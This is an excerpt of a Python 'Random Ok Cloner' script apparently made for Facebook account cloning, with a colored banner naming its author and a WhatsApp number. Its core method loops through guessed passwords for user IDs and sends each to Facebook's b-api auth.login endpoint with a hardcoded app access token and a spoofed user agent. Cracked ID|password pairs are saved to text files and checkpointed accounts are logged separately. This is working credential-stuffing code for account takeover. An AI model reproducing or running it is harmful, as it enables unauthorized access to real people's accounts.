...
\033[0;=========================\033[0;93mIt's Brand\033[0;99m==============================                                                                                                                              
          \033[0;95m╔═══════════════════════════════════════════╗
          \033[0;95m║  \033[0;94m [!]\033[0;90mTOOL OWER :\033[0;92m MD SHAHINUR RAHMAN             \033[0;95m║
          \033[0;95m║ \033[0;94m  [!]\033[0;90mTOOL NAME :\033[0;92m Random Ok Cloner        \033[0;95m ║
          \033[0;95m║ \033[0;94m  [!]\033[0;90mVERSION   :\033[0;92m 0.2                      \033[0;95m║
          \033[0;95m║ \033[0;94m  [!]\033[0;90mWHATS APP :\033[0;92m +96878217235     \033[0;95m ║
          \033[0;95m╚═══════════════════════════════════════════╝ \033[0;00m""")
...
class Main:
	def __init__(self):
		...
		if Baloch in ["", " "]:
			...
			os.system("xdg-open https://www.facebook.com/mdshahinur.rahman.195349?mibextid=ZbWKwL")
			print("")
			time.sleep(3.0)
			...
			time.sleep(3.1)
			print("")
			print("\033[1;32m   (SHAHIN)𝐄𝐍𝐉𝐎𝐘 𝐓𝐇𝐈𝐒 𝐓𝐎𝐎𝐋𝐒 𓃵  ")
			time.sleep(3.0)
			os.system("clear")
		print(logo)
		print("\033[1;37m ============================================================== ")
		...
		print(" \033[1;37m[2] :::::::::➤ 𝗙𝗥𝗔𝗦𝗛 𝗜𝗗 𝗖𝗟𝗢𝗡𝗘 (SHAHIN)𖦹 ")
    ...
    'user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',
			...
			if "session_key" in response.text and "EAAA" in response.text:
				print("\r \033[1;37m[SHAHIN-𝘿𝙊𝙉𝙀]%s | %s\033[1;37m         "%(uid, pw))
				print ("\r \033[1;32m Congrats ")
				self.ok.append("%s|%s"%(uid, pw))
				open("SHAHIN-𝘿𝙊𝙉𝙀.txt","a").write(" %s|%s\n"%(uid, pw))
				break
	...
	def api(self, uid, pwx):
		...
		for pw in pwx:
			...
			response = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20¤tly_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers) 
			if "session_key" in response.text and "EAAA" in response.text:
				print("\r \033[1;37m[SHAHIN-𝘿𝙊𝙉𝙀] %s | %s\033[0;37m         "%(uid, pw))
				print ("\r \033[1;37m Congrats ")
				self.ok.append("%s|%s"%(uid, pw))
				open("ASIF-SUCCESSFULL.txt","a").write(" %s|%s\n"%(uid, pw))
				break
			elif "www.facebook.com" in response.json()["error_msg"]:
				print("\r \033[1;32m[SHAHIN-𝘿𝙊𝙉𝙀] %s | %s\033[1;37m         "%(uid, pw))
				self.cp.append("%s|%s"%(uid, pw))
